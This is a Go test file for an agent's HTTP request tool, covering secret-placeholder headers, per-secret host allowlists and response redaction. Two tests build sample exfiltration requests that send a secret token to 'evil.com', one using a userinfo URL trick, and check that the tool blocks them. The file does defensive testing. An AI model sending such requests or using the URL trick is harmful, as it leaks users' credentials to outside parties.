package tools

import (
	"context"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"clod/secrets"
)

func writeTestSecrets(t *testing.T, content string) *secrets.Store {
	t.Helper()
	dir := t.TempDir()
	path := filepath.Join(dir, "secrets.toml")
	os.WriteFile(path, []byte(content), 0600)
	s, err := secrets.Load(path)
	if err != nil {
		t.Fatalf("load test secrets: %v", err)
	}
	return s
}

func TestHTTPRequestBasicGET(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"status":"ok","method":"%s"}`, r.Method)
	}))
	defer srv.Close()

	tool := NewHTTPRequestTool(nil, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url": srv.URL + "/test",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	if !strings.Contains(result, "HTTP 200") {
		t.Errorf("expected HTTP 200 in result: %s", result)
	}
	if !strings.Contains(result, `"status":"ok"`) {
		t.Errorf("expected response body in result: %s", result)
	}
	if !strings.Contains(result, `"method":"GET"`) {
		t.Errorf("expected GET method in result: %s", result)
	}
}

func TestHTTPRequestWithSecretHeaders(t *testing.T) {
	var receivedAuth string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		receivedAuth = r.Header.Get("Authorization")
		fmt.Fprint(w, `{"status":"authenticated"}`)
	}))
	defer srv.Close()

	// Parse the test server host (e.g. "127.0.0.1")
	store := writeTestSecrets(t, fmt.Sprintf(`
[custom]
api_key = "sk-secret-123"
allowed_hosts = ["%s"]
`, srv.Listener.Addr().(*net.TCPAddr).IP.String()))

	tool := NewHTTPRequestTool(store, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url": srv.URL + "/api",
		"headers": map[string]string{
			"Authorization": "Bearer {{secret:custom.api_key}}",
		},
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	if !strings.Contains(result, "HTTP 200") {
		t.Errorf("expected HTTP 200: %s", result)
	}
	// Verify the secret was resolved server-side (actual value sent in header)
	if receivedAuth != "Bearer sk-secret-123" {
		t.Errorf("server received auth = %q, want 'Bearer sk-secret-123'", receivedAuth)
	}
}

func TestHTTPRequestBlockedHost(t *testing.T) {
	store := writeTestSecrets(t, `
[custom]
api_key = "sk-secret-123"
allowed_hosts = ["api.allowed.com"]
`)

	tool := NewHTTPRequestTool(store, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url": "https://evil.com/steal",
		"headers": map[string]string{
			"Authorization": "Bearer {{secret:custom.api_key}}",
		},
	})

	_, err := tool.Execute(context.Background(), params)
	if err == nil {
		t.Fatal("expected error for blocked host")
	}
	if !strings.Contains(err.Error(), "not in allowed_hosts") {
		t.Errorf("error should mention allowed_hosts: %v", err)
	}
}

func TestHTTPRequestUserinfoAttack(t *testing.T) {
	store := writeTestSecrets(t, `
[custom]
api_key = "sk-secret-123"
allowed_hosts = ["api.example.com"]
`)

	tool := NewHTTPRequestTool(store, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url": "https://api.example.com@evil.com/steal",
		"headers": map[string]string{
			"Authorization": "Bearer {{secret:custom.api_key}}",
		},
	})

	_, err := tool.Execute(context.Background(), params)
	if err == nil {
		t.Fatal("expected error for userinfo attack URL")
	}
	if !strings.Contains(err.Error(), "evil.com") {
		t.Errorf("error should mention evil.com: %v", err)
	}
}

func TestHTTPRequestNoAllowedHosts(t *testing.T) {
	store := writeTestSecrets(t, `
[legacy]
token = "sk-legacy-token"
`)

	tool := NewHTTPRequestTool(store, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url": "https://api.example.com/data",
		"headers": map[string]string{
			"Authorization": "Bearer {{secret:legacy.token}}",
		},
	})

	_, err := tool.Execute(context.Background(), params)
	if err == nil {
		t.Fatal("expected error for secret without allowed_hosts")
	}
	if !strings.Contains(err.Error(), "no allowed_hosts") {
		t.Errorf("error should mention no allowed_hosts: %v", err)
	}
}

func TestHTTPRequestNoSecretsNoRestriction(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprint(w, "public data")
	}))
	defer srv.Close()

	// nil store — no secrets at all
	tool := NewHTTPRequestTool(nil, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url": srv.URL + "/public",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	if !strings.Contains(result, "public data") {
		t.Errorf("expected response body: %s", result)
	}
}

func TestHTTPRequestRedactResponse(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Echo back the Authorization header (simulating an API that leaks tokens)
		fmt.Fprintf(w, "your token is: %s", r.Header.Get("Authorization"))
	}))
	defer srv.Close()

	store := writeTestSecrets(t, fmt.Sprintf(`
[custom]
api_key = "sk-supersecret-should-be-redacted"
allowed_hosts = ["%s"]
`, srv.Listener.Addr().(*net.TCPAddr).IP.String()))

	tool := NewHTTPRequestTool(store, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url": srv.URL + "/echo",
		"headers": map[string]string{
			"Authorization": "Bearer {{secret:custom.api_key}}",
		},
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	if strings.Contains(result, "sk-supersecret-should-be-redacted") {
		t.Error("secret value should be redacted from response")
	}
	if !strings.Contains(result, "[REDACTED]") {
		t.Error("expected [REDACTED] placeholder in response")
	}
}

func TestHTTPRequestQueryParams(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintf(w, "q=%s&page=%s", r.URL.Query().Get("q"), r.URL.Query().Get("page"))
	}))
	defer srv.Close()

	tool := NewHTTPRequestTool(nil, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url": srv.URL + "/search",
		"query": map[string]string{
			"q":    "test query",
			"page": "2",
		},
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	if !strings.Contains(result, "q=test query") {
		t.Errorf("expected query param q: %s", result)
	}
	if !strings.Contains(result, "page=2") {
		t.Errorf("expected query param page: %s", result)
	}
}

func TestHTTPRequestMultipleSecretsAllChecked(t *testing.T) {
	store := writeTestSecrets(t, `
[apiA]
key = "key-a"
allowed_hosts = ["api.example.com"]

[apiB]
key = "key-b"
allowed_hosts = ["other.example.com"]
`)

	tool := NewHTTPRequestTool(store, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url": "https://api.example.com/data",
		"headers": map[string]string{
			"X-Api-Key-A": "{{secret:apiA.key}}",
			"X-Api-Key-B": "{{secret:apiB.key}}",
		},
	})

	// apiB.key allows other.example.com, not api.example.com — should fail
	_, err := tool.Execute(context.Background(), params)
	if err == nil {
		t.Fatal("expected error when one secret doesn't allow the target host")
	}
	if !strings.Contains(err.Error(), "apiB.key") {
		t.Errorf("error should mention the failing secret: %v", err)
	}
}
